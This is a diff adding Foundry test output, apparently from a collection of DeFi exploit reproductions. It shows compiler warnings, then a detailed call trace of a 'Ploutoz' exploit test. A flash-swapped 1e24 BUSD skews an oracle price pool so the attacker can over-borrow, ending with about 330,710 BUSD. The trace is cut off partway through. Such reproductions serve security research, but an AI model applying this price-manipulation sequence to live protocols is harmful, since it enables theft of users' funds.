@@ -1,0 +1,820 @@
+Compiling 28 files with Solc 0.8.25
+Solc 0.8.25 finished in 1.25s
+Compiler run successful with warnings:
+Warning (2519): This declaration shadows an existing declaration.
+   --> src/test/interface.sol:886:5:
+    |
+886 |     function WETH() external view returns (address);
+    |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+Note: The shadowed declaration is here:
+   --> src/test/interface.sol:641:1:
+    |
+641 | interface WETH {
+    | ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2519): This declaration shadows an existing declaration.
+    --> src/test/interface.sol:1598:5:
+     |
+1598 |     function WETH() external view returns (address);
+     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+Note: The shadowed declaration is here:
+   --> src/test/interface.sol:641:1:
+    |
+641 | interface WETH {
+    | ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2519): This declaration shadows an existing declaration.
+    --> src/test/interface.sol:1850:5:
+     |
+1850 |     function WETH() external view returns (address);
+     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+Note: The shadowed declaration is here:
+   --> src/test/interface.sol:641:1:
+    |
+641 | interface WETH {
+    | ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2519): This declaration shadows an existing declaration.
+    --> src/test/interface.sol:2560:5:
+     |
+2560 |     function WETH() external view returns (address);
+     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+Note: The shadowed declaration is here:
+   --> src/test/interface.sol:641:1:
+    |
+641 | interface WETH {
+    | ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2519): This declaration shadows an existing declaration.
+    --> src/test/interface.sol:3759:5:
+     |
+3759 |     function WETH() external view returns (address);
+     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+Note: The shadowed declaration is here:
+   --> src/test/interface.sol:641:1:
+    |
+641 | interface WETH {
+    | ^ (Relevant source part starts here and spans across multiple lines).
+
+
+Ran 1 test for script/Exploit-template_new.sol:ExploitScript
+[PASS] testExploit() (gas: 20453)
+Logs:
+  Attacker ETH Balance Before exploit: 0.000000000000000000
+  Attacker ETH Balance After exploit: 0.000000000000000000
+
+Traces:
+  [20453] ExploitScript::testExploit()
+    ├─ [0] VM::deal(ExploitScript: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0)
+    │   └─ ← [Return] 
+    ├─ emit log_named_decimal_uint(key: "Attacker ETH Balance Before exploit", val: 0, decimals: 18)
+    ├─ emit log_named_decimal_uint(key: "Attacker ETH Balance After exploit", val: 0, decimals: 18)
+    └─ ← [Stop] 
+
+Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 316.84ms (146.85µs CPU time)
+
+Ran 1 test for src/test/2021-11/Ploutoz_exp.sol:Ploutoz
+[PASS] testExploit() (gas: 5052249)
+Logs:
+  Attacker BUSD Balance Before exploit: 0.000000000000000000
+  Attacker BUSD Balance After exploit: 330710.465786434363679318
+
+Traces:
+  [5250349] Ploutoz::testExploit()
+    ├─ [3081] 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56::symbol() [staticcall]
+    │   └─ ← [Return] "BUSD"
+    ├─ [2531] 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56::balanceOf(Ploutoz: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   └─ ← [Return] 0
+    ├─ [2425] 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56::decimals() [staticcall]
+    │   └─ ← [Return] 18
+    ├─ emit log_named_decimal_uint(key: "Attacker BUSD Balance Before exploit", val: 0, decimals: 18)
+    ├─ [4748038] 0x58F876857a02D6762E0101bb5C46A8c1ED44Dc16::swap(0, 1000400000000000000000000 [1e24], Ploutoz: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x58)
+    │   ├─ [27971] 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56::transfer(Ploutoz: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1000400000000000000000000 [1e24])
+    │   │   ├─ emit Transfer(from: 0x58F876857a02D6762E0101bb5C46A8c1ED44Dc16, to: Ploutoz: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 1000400000000000000000000 [1e24])
+    │   │   └─ ← [Return] true
+    │   ├─ [4689109] Ploutoz::pancakeCall(Ploutoz: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0, 1000400000000000000000000 [1e24], 0x58)
+    │   │   ├─ [4662] 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56::approve(0x6B011d0d53b0Da6ace2a3F436Fd197A4E35f47EF, 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   │   │   ├─ emit Approval(owner: Ploutoz: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: 0x6B011d0d53b0Da6ace2a3F436Fd197A4E35f47EF, value: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ [91419] 0x6B011d0d53b0Da6ace2a3F436Fd197A4E35f47EF::swapExactTokensForTokens(1000000000000000000000000 [1e24], 0, [0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56, 0x844FA82f1E54824655470970F7004Dd90546bB28], Ploutoz: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1637659441 [1.637e9])
+    │   │   │   ├─ [2504] 0xC789F6C658809eED4d1769a46fc7BCe5dbB8316E::getReserves() [staticcall]
+    │   │   │   │   └─ ← [Return] 584267772559703112832721 [5.842e23], 24535809866719119382771 [2.453e22], 1637659325 [1.637e9]
+    │   │   │   ├─ [13634] 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56::transferFrom(Ploutoz: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0xC789F6C658809eED4d1769a46fc7BCe5dbB8316E, 1000000000000000000000000 [1e24])
+    │   │   │   │   ├─ emit Transfer(from: Ploutoz: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0xC789F6C658809eED4d1769a46fc7BCe5dbB8316E, value: 1000000000000000000000000 [1e24])
+    │   │   │   │   ├─ emit Approval(owner: Ploutoz: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: 0x6B011d0d53b0Da6ace2a3F436Fd197A4E35f47EF, value: 115792089237316195423570985008687907853269984665640563039457584007913129639935 [1.157e77])
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [64992] 0xC789F6C658809eED4d1769a46fc7BCe5dbB8316E::swap(570234507313087106351409 [5.702e23], 0, Ploutoz: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x)
+    │   │   │   │   ├─ [30081] 0x844FA82f1E54824655470970F7004Dd90546bB28::transfer(Ploutoz: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 570234507313087106351409 [5.702e23])
+    │   │   │   │   │   ├─ emit Transfer(from: 0xC789F6C658809eED4d1769a46fc7BCe5dbB8316E, to: Ploutoz: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 570234507313087106351409 [5.702e23])
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   ├─ [557] 0x844FA82f1E54824655470970F7004Dd90546bB28::balanceOf(0xC789F6C658809eED4d1769a46fc7BCe5dbB8316E) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 14033265246616006481312 [1.403e22]
+    │   │   │   │   ├─ [531] 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56::balanceOf(0xC789F6C658809eED4d1769a46fc7BCe5dbB8316E) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 1024535809866719119382771 [1.024e24]
+    │   │   │   │   ├─ emit Sync(reserve0: 14033265246616006481312 [1.403e22], reserve1: 1024535809866719119382771 [1.024e24])
+    │   │   │   │   ├─ emit Swap(sender: 0x6B011d0d53b0Da6ace2a3F436Fd197A4E35f47EF, amount0In: 0, amount1In: 1000000000000000000000000 [1e24], amount0Out: 570234507313087106351409 [5.702e23], amount1Out: 0, to: Ploutoz: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
+    │   │   │   │   └─ ← [Stop] 
+    │   │   │   └─ ← [Return] [1000000000000000000000000 [1e24], 570234507313087106351409 [5.702e23]]
+    │   │   ├─ [4662] 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56::approve(0x10ED43C718714eb63d5aA57B78B54704E256024E, 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   │   │   ├─ emit Approval(owner: Ploutoz: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: 0x10ED43C718714eb63d5aA57B78B54704E256024E, value: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ [70077] 0x10ED43C718714eb63d5aA57B78B54704E256024E::swapExactTokensForTokens(400000000000000000000 [4e20], 0, [0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56, 0x844FA82f1E54824655470970F7004Dd90546bB28], Ploutoz: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1637659441 [1.637e9])
+    │   │   │   ├─ [2893] 0xb694ec7C2a7C433E69200b1dA3EBc86907B4578B::getReserves() [staticcall]
+    │   │   │   │   └─ ← [Return] 126348407350277896921241 [1.263e23], 5303099967190723392151 [5.303e21], 1637650508 [1.637e9]
+    │   │   │   ├─ [13634] 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56::transferFrom(Ploutoz: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0xb694ec7C2a7C433E69200b1dA3EBc86907B4578B, 400000000000000000000 [4e20])
+    │   │   │   │   ├─ emit Transfer(from: Ploutoz: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0xb694ec7C2a7C433E69200b1dA3EBc86907B4578B, value: 400000000000000000000 [4e20])
+    │   │   │   │   ├─ emit Approval(owner: Ploutoz: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: 0x10ED43C718714eb63d5aA57B78B54704E256024E, value: 115792089237316195423570985008687907853269984665640564039057584007913129639935 [1.157e77])
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [42581] 0xb694ec7C2a7C433E69200b1dA3EBc86907B4578B::swap(8841131306506726194396 [8.841e21], 0, Ploutoz: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x)
+    │   │   │   │   ├─ [8181] 0x844FA82f1E54824655470970F7004Dd90546bB28::transfer(Ploutoz: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 8841131306506726194396 [8.841e21])
+    │   │   │   │   │   ├─ emit Transfer(from: 0xb694ec7C2a7C433E69200b1dA3EBc86907B4578B, to: Ploutoz: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 8841131306506726194396 [8.841e21])
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   ├─ [557] 0x844FA82f1E54824655470970F7004Dd90546bB28::balanceOf(0xb694ec7C2a7C433E69200b1dA3EBc86907B4578B) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 117507276043771170726845 [1.175e23]
+    │   │   │   │   ├─ [531] 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56::balanceOf(0xb694ec7C2a7C433E69200b1dA3EBc86907B4578B) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 5703099967190723392151 [5.703e21]
+    │   │   │   │   ├─ emit Sync(reserve0: 117507276043771170726845 [1.175e23], reserve1: 5703099967190723392151 [5.703e21])
+    │   │   │   │   ├─ emit Swap(sender: 0x10ED43C718714eb63d5aA57B78B54704E256024E, amount0In: 0, amount1In: 400000000000000000000 [4e20], amount0Out: 8841131306506726194396 [8.841e21], amount1Out: 0, to: Ploutoz: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
+    │   │   │   │   └─ ← [Stop] 
+    │   │   │   └─ ← [Return] [400000000000000000000 [4e20], 8841131306506726194396 [8.841e21]]
+    │   │   ├─ [838800] 0x539Ff593840387439196721cB2Ce5a94051DAEB6::borrow(0x0000000000000000000000000000000000000000000000000000000000000000, 85000000000000000000 [8.5e19], 7200, 50000000000000000000 [5e19], 0x844FA82f1E54824655470970F7004Dd90546bB28, Ploutoz: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], Ploutoz: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x)
+    │   │   │   ├─ [833512] 0x8e9654f15ee934eDab16350E933577E0F9566d27::borrow(0x0000000000000000000000000000000000000000000000000000000000000000, 85000000000000000000 [8.5e19], 7200, 50000000000000000000 [5e19], 0x844FA82f1E54824655470970F7004Dd90546bB28, Ploutoz: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], Ploutoz: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x) [delegatecall]
+    │   │   │   │   ├─ [16227] 0xAd2d8F920A3795C1EeE47a00C1056c801eAaD18C::withdrawAccruedInterest(0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82)
+    │   │   │   │   │   ├─ [10888] 0x86FBf26921CE39F9064d454002d71e565678b493::withdrawAccruedInterest(0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82) [delegatecall]
+    │   │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   │   └─ ← [Return] 
+    │   │   │   │   ├─ [8461] 0xAd2d8F920A3795C1EeE47a00C1056c801eAaD18C::getTotalPrincipal(0x539Ff593840387439196721cB2Ce5a94051DAEB6, 0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82) [staticcall]
+    │   │   │   │   │   ├─ [3112] 0x628035bAc24e451Da14981e9B46cC0FaB86711c2::getTotalPrincipal(0x539Ff593840387439196721cB2Ce5a94051DAEB6, 0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82) [delegatecall]
+    │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000001a326cb295d9898ba
+    │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000001a326cb295d9898ba
+    │   │   │   │   ├─ [2531] 0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82::balanceOf(0x539Ff593840387439196721cB2Ce5a94051DAEB6) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 85172964952637866430 [8.517e19]
+    │   │   │   │   ├─ [1961] 0xAd2d8F920A3795C1EeE47a00C1056c801eAaD18C::getTotalPrincipal(0x539Ff593840387439196721cB2Ce5a94051DAEB6, 0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82) [staticcall]
+    │   │   │   │   │   ├─ [1112] 0x628035bAc24e451Da14981e9B46cC0FaB86711c2::getTotalPrincipal(0x539Ff593840387439196721cB2Ce5a94051DAEB6, 0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82) [delegatecall]
+    │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000001a326cb295d9898ba
+    │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000001a326cb295d9898ba
+    │   │   │   │   ├─ [531] 0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82::balanceOf(0x539Ff593840387439196721cB2Ce5a94051DAEB6) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 85172964952637866430 [8.517e19]
+    │   │   │   │   ├─ [27983] 0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82::transfer(Ploutoz: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 85000000000000000000 [8.5e19])
+    │   │   │   │   │   ├─ emit Transfer(from: 0x539Ff593840387439196721cB2Ce5a94051DAEB6, to: Ploutoz: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 85000000000000000000 [8.5e19])
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   ├─ [8083] 0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82::transfer(0xAd2d8F920A3795C1EeE47a00C1056c801eAaD18C, 19287705282065987 [1.928e16])
+    │   │   │   │   │   ├─ emit Transfer(from: 0x539Ff593840387439196721cB2Ce5a94051DAEB6, to: 0xAd2d8F920A3795C1EeE47a00C1056c801eAaD18C, value: 19287705282065987 [1.928e16])
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   ├─ [15655] 0x844FA82f1E54824655470970F7004Dd90546bB28::transferFrom(Ploutoz: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0xAd2d8F920A3795C1EeE47a00C1056c801eAaD18C, 50000000000000000000 [5e19])
+    │   │   │   │   │   ├─ emit Transfer(from: Ploutoz: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0xAd2d8F920A3795C1EeE47a00C1056c801eAaD18C, value: 50000000000000000000 [5e19])
+    │   │   │   │   │   ├─ emit Approval(owner: Ploutoz: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: 0x539Ff593840387439196721cB2Ce5a94051DAEB6, value: 115792089237316195423570985008687907853269984665640564039407584007913129639935 [1.157e77])
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   ├─ [688067] 0xAd2d8F920A3795C1EeE47a00C1056c801eAaD18C::borrowOrTradeFromPool(0x326b2da4b189db0f5bbd75aea0f741e07b7ad16490d2570b9f362d57dc3b74eb, 0x0000000000000000000000000000000000000000000000000000000000000000, true, 50000000000000000000 [5e19], [0x539Ff593840387439196721cB2Ce5a94051DAEB6, 0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496, 0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496, 0x0000000000000000000000000000000000000000], [99365863224234716817 [9.936e19], 85019287705282065987 [8.501e19], 19287705282065987 [1.928e16], 19287705282065987 [1.928e16], 50000000000000000000 [5e19]], 0x)
+    │   │   │   │   │   ├─ [682633] 0x067D0A19e92a65CAa2Fcd8F3c88DA8851fCd3771::borrowOrTradeFromPool(0x326b2da4b189db0f5bbd75aea0f741e07b7ad16490d2570b9f362d57dc3b74eb, 0x0000000000000000000000000000000000000000000000000000000000000000, true, 50000000000000000000 [5e19], [0x539Ff593840387439196721cB2Ce5a94051DAEB6, 0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496, 0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496, 0x0000000000000000000000000000000000000000], [99365863224234716817 [9.936e19], 85019287705282065987 [8.501e19], 19287705282065987 [1.928e16], 19287705282065987 [1.928e16], 50000000000000000000 [5e19]], 0x) [delegatecall]
+    │   │   │   │   │   │   ├─ [45374] 0x86043747dae9b6dd80C463A29e5B21e50BeF5e7d::queryRate(0x844FA82f1E54824655470970F7004Dd90546bB28, 0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82) [staticcall]
+    │   │   │   │   │   │   │   ├─ [6044] 0xA41BF81be90fe9666CD566A80c85871f41529aed::latestAnswer() [staticcall]
+    │   │   │   │   │   │   │   │   ├─ [504] 0xC789F6C658809eED4d1769a46fc7BCe5dbB8316E::getReserves() [staticcall]
+    │   │   │   │   │   │   │   │   │   └─ ← [Return] 14033265246616006481312 [1.403e22], 1024535809866719119382771 [1.024e24], 1637659441 [1.637e9]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 73007656583258593795 [7.3e19]
+    │   │   │   │   │   │   │   ├─ [10933] 0x72920b37bB158529d2837d3978F6B636A31626D8::latestAnswer() [staticcall]
+    │   │   │   │   │   │   │   │   ├─ [2893] 0x804678fa97d91B974ec2af3c843270886528a9E6::getReserves() [staticcall]
+    │   │   │   │   │   │   │   │   │   └─ ← [Return] 1596652562252473757149170 [1.596e24], 23615711342557801053422323 [2.361e25], 1637659426 [1.637e9]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 14790764065315495531 [1.479e19]
+    │   │   │   │   │   │   │   ├─ [2381] 0x844FA82f1E54824655470970F7004Dd90546bB28::decimals() [staticcall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 18
+    │   │   │   │   │   │   │   ├─ [2403] 0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82::decimals() [staticcall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 18
+    │   │   │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000044804d38913d72d60000000000000000000000000000000000000000000000000de0b6b3a7640000
+    │   │   │   │   │   │   ├─  emit topic 0: 0xfb6c38ae4fdd498b3a5003f02ca4ca5340dfedb36b1b100c679eb60633b2c0a7
+    │   │   │   │   │   │   │        topic 1: 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496
+    │   │   │   │   │   │   │        topic 2: 0x000000000000000000000000844fa82f1e54824655470970f7004dd90546bb28
+    │   │   │   │   │   │   │        topic 3: 0x9790ae8ac49fba9c712bfe7fdb39d35a815d53c2efd205c05416162379bb8a66
+    │   │   │   │   │   │   │           data: 0x000000000000000000000000000000000000000000000000009fdf42f6e48000
+    │   │   │   │   │   │   ├─ [12799] 0x86043747dae9b6dd80C463A29e5B21e50BeF5e7d::queryReturn(0x844FA82f1E54824655470970F7004Dd90546bB28, 0xAd2d8F920A3795C1EeE47a00C1056c801eAaD18C, 22500000000000000 [2.25e16]) [staticcall]
+    │   │   │   │   │   │   │   ├─ [2044] 0xA41BF81be90fe9666CD566A80c85871f41529aed::latestAnswer() [staticcall]
+    │   │   │   │   │   │   │   │   ├─ [504] 0xC789F6C658809eED4d1769a46fc7BCe5dbB8316E::getReserves() [staticcall]
+    │   │   │   │   │   │   │   │   │   └─ ← [Return] 14033265246616006481312 [1.403e22], 1024535809866719119382771 [1.024e24], 1637659441 [1.637e9]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 73007656583258593795 [7.3e19]
+    │   │   │   │   │   │   │   ├─ [381] 0x844FA82f1E54824655470970F7004Dd90546bB28::decimals() [staticcall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 18
+    │   │   │   │   │   │   │   ├─ [2704] 0xAd2d8F920A3795C1EeE47a00C1056c801eAaD18C::decimals() [staticcall]
+    │   │   │   │   │   │   │   │   └─ ← [Revert] revert: target not active
+    │   │   │   │   │   │   │   └─ ← [Revert] revert: target not active
+    │   │   │   │   │   │   ├─ [11313] 0x86043747dae9b6dd80C463A29e5B21e50BeF5e7d::getCurrentMargin(0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82, 0x844FA82f1E54824655470970F7004Dd90546bB28, 85019287705282065987 [8.501e19], 49955000000000000000 [4.995e19]) [staticcall]
+    │   │   │   │   │   │   │   ├─ [2044] 0xA41BF81be90fe9666CD566A80c85871f41529aed::latestAnswer() [staticcall]
+    │   │   │   │   │   │   │   │   ├─ [504] 0xC789F6C658809eED4d1769a46fc7BCe5dbB8316E::getReserves() [staticcall]
+    │   │   │   │   │   │   │   │   │   └─ ← [Return] 14033265246616006481312 [1.403e22], 1024535809866719119382771 [1.024e24], 1637659441 [1.637e9]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 73007656583258593795 [7.3e19]
+    │   │   │   │   │   │   │   ├─ [2433] 0x72920b37bB158529d2837d3978F6B636A31626D8::latestAnswer() [staticcall]
+    │   │   │   │   │   │   │   │   ├─ [893] 0x804678fa97d91B974ec2af3c843270886528a9E6::getReserves() [staticcall]
+    │   │   │   │   │   │   │   │   │   └─ ← [Return] 1596652562252473757149170 [1.596e24], 23615711342557801053422323 [2.361e25], 1637659426 [1.637e9]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 14790764065315495531 [1.479e19]
+    │   │   │   │   │   │   │   ├─ [381] 0x844FA82f1E54824655470970F7004Dd90546bB28::decimals() [staticcall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 18
+    │   │   │   │   │   │   │   ├─ [403] 0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82::decimals() [staticcall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 18
+    │   │   │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000a4d29961630da881000000000000000000000000000000000000000000000000044804d38913d72d6
+    │   │   │   │   │   │   ├─  emit topic 0: 0x7bd8cbb7ba34b33004f3deda0fd36c92fc0360acbd97843360037b467a538f90
+    │   │   │   │   │   │   │        topic 1: 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496
+    │   │   │   │   │   │   │        topic 2: 0x000000000000000000000000539ff593840387439196721cb2ce5a94051daeb6
+    │   │   │   │   │   │   │        topic 3: 0x9790ae8ac49fba9c712bfe7fdb39d35a815d53c2efd205c05416162379bb8a66
+    │   │   │   │   │   │   │           data: 0x0000000000000000000000000e09fabb73bd3ade0a17ecc321fd13a19e81ce82000000000000000000000000844fa82f1e54824655470970f7004dd90546bb280000000000000000000000000000000000000000000000049be12fb76a12b643000000000000000000000000000000000000000000000002b543cfd3baa3800000000000000000000000000000000000000000000000000562fa7623b88fae910000000000000000000000000000000000000000000000000000000000001c1f00000000000000000000000000000000000000000000000044804d38913d72d600000000000000000000000000000000000000000000000a4d29961630da8810
+    │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000049be12fb76a12b643000000000000000000000000000000000000000000000002b543cfd3baa38000
+    │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000049be12fb76a12b643000000000000000000000000000000000000000000000002b543cfd3baa38000
+    │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000049be12fb76a12b643000000000000000000000000000000000000000000000002b543cfd3baa38000
+    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000049be12fb76a12b643000000000000000000000000000000000000000000000002b543cfd3baa38000
+    │   │   ├─ [777686] 0xD90EFadeA37a6dB7f6EAC73cC9627Ca87aC7F705::borrow(0x0000000000000000000000000000000000000000000000000000000000000000, 18000000000000000000000 [1.8e22], 7200, 500000000000000000000 [5e20], 0x844FA82f1E54824655470970F7004Dd90546bB28, Ploutoz: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], Ploutoz: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x)
+    │   │   │   ├─ [774898] 0x8e9654f15ee934eDab16350E933577E0F9566d27::borrow(0x0000000000000000000000000000000000000000000000000000000000000000, 18000000000000000000000 [1.8e22], 7200, 500000000000000000000 [5e20], 0x844FA82f1E54824655470970F7004Dd90546bB28, Ploutoz: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], Ploutoz: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x) [delegatecall]
+    │   │   │   │   ├─ [11727] 0xAd2d8F920A3795C1EeE47a00C1056c801eAaD18C::withdrawAccruedInterest(0xfF54da7CAF3BC3D34664891fC8f3c9B6DeA6c7A5)
+    │   │   │   │   │   ├─ [10888] 0x86FBf26921CE39F9064d454002d71e565678b493::withdrawAccruedInterest(0xfF54da7CAF3BC3D34664891fC8f3c9B6DeA6c7A5) [delegatecall]
+    │   │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   │   └─ ← [Return] 
+    │   │   │   │   ├─ [3961] 0xAd2d8F920A3795C1EeE47a00C1056c801eAaD18C::getTotalPrincipal(0xD90EFadeA37a6dB7f6EAC73cC9627Ca87aC7F705, 0xfF54da7CAF3BC3D34664891fC8f3c9B6DeA6c7A5) [staticcall]
+    │   │   │   │   │   ├─ [3112] 0x628035bAc24e451Da14981e9B46cC0FaB86711c2::getTotalPrincipal(0xD90EFadeA37a6dB7f6EAC73cC9627Ca87aC7F705, 0xfF54da7CAF3BC3D34664891fC8f3c9B6DeA6c7A5) [delegatecall]
+    │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000031b77c87c2eecf395
+    │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000031b77c87c2eecf395
+    │   │   │   │   ├─ [2510] 0xfF54da7CAF3BC3D34664891fC8f3c9B6DeA6c7A5::balanceOf(0xD90EFadeA37a6dB7f6EAC73cC9627Ca87aC7F705) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 18106370863458280253865 [1.81e22]
+    │   │   │   │   ├─ [1961] 0xAd2d8F920A3795C1EeE47a00C1056c801eAaD18C::getTotalPrincipal(0xD90EFadeA37a6dB7f6EAC73cC9627Ca87aC7F705, 0xfF54da7CAF3BC3D34664891fC8f3c9B6DeA6c7A5) [staticcall]
+    │   │   │   │   │   ├─ [1112] 0x628035bAc24e451Da14981e9B46cC0FaB86711c2::getTotalPrincipal(0xD90EFadeA37a6dB7f6EAC73cC9627Ca87aC7F705, 0xfF54da7CAF3BC3D34664891fC8f3c9B6DeA6c7A5) [delegatecall]
+    │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000031b77c87c2eecf395
+    │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000031b77c87c2eecf395
+    │   │   │   │   ├─ [510] 0xfF54da7CAF3BC3D34664891fC8f3c9B6DeA6c7A5::balanceOf(0xD90EFadeA37a6dB7f6EAC73cC9627Ca87aC7F705) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 18106370863458280253865 [1.81e22]
+    │   │   │   │   ├─ [85290] 0xfF54da7CAF3BC3D34664891fC8f3c9B6DeA6c7A5::transfer(Ploutoz: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 18000000000000000000000 [1.8e22])
